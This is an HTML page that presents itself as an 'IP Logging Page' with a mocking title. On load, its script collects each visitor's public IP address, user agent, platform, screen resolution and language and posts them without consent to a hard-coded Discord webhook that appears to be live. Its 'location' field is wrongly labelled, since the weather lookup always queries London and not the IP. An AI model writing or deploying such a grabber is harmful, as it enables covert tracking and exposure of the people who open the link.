<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello, You're not sigma</title>
</head>
<body>
    <h1>Hello, Welcome to the IP Logging Page</h1>

    <script>
        // Replace this with your actual OpenWeatherMap API key
        const openWeatherApiKey = 'your-openweather-api-key';

        // Function to get user's device specs
        function getDeviceSpecs() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                language: navigator.language,
            };
        }

        // Fetch the user's public IP address using the ipify API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                const userIp = data.ip;

                // Fetch location and weather based on the user's IP using OpenWeatherMap API
                fetch(`https://api.openweathermap.org/data/2.5/weather?q=London&appid=${openWeatherApiKey}`)
                    .then(response => response.json())
                    .then(weatherData => {
                        const weather = {
                            location: weatherData.name,
                            temperature: (weatherData.main.temp - 273.15).toFixed(2), // Convert from Kelvin to Celsius
                            description: weatherData.weather[0].description,
                        };

                        // Get device specs
                        const deviceSpecs = getDeviceSpecs();

                        // Prepare the data to send to the webhook
                        const payload = {
                            content: `New visitor logged:
                            - IP Address: ${userIp}
                            - Location: ${weather.location}
                            - Temperature: ${weather.temperature} Â°C
                            - Weather: ${weather.description}
                            - Device: ${deviceSpecs.userAgent}
                            - Platform: ${deviceSpecs.platform}
                            - Screen Resolution: ${deviceSpecs.screenWidth}x${deviceSpecs.screenHeight}
                            - Language: ${deviceSpecs.language}`,
                        };

                        // Send the data to your Discord webhook (replace with your actual webhook)
                        fetch('https://discord.com/api/webhooks/1291682857823113218/Cs2QifGkh0lo4X-WyXhrPXrukc6AZemMeKlbWyo8V0dhmjZEYpccO5lq4T-2TzOCXVam', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify(payload),
                        })
                        .then(response => console.log('Data sent to webhook:', response))
                        .catch(error => console.error('Error sending data to webhook:', error));
                    })
                    .catch(error => console.error('Error fetching weather data:', error));
            })
            .catch(error => console.error('Error fetching IP:', error));
    </script>
</body>
</html>
